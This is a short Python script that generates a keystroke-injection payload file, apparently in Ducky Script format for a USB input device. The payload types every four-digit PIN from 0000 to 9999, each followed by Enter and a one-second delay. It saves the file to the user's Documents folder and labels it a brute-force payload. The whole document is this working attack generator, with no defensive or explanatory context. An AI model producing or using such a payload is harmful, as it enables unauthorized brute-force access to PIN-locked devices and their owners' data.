import os

# Define output path inside user's Documents
doc_folder = os.path.join(os.environ["USERPROFILE"], "Documents")
output_file = os.path.join(doc_folder, "full_4digit_bf.txt")

# Build brute-force payload
with open(output_file, "w") as f:
    for i in range(10000):
        pin = str(i).zfill(4)
        f.write(f"STRING {pin}\n")
        f.write("ENTER\n")
        f.write("DELAY 1000\n")

print(f"Brute-force file saved to: {output_file}")
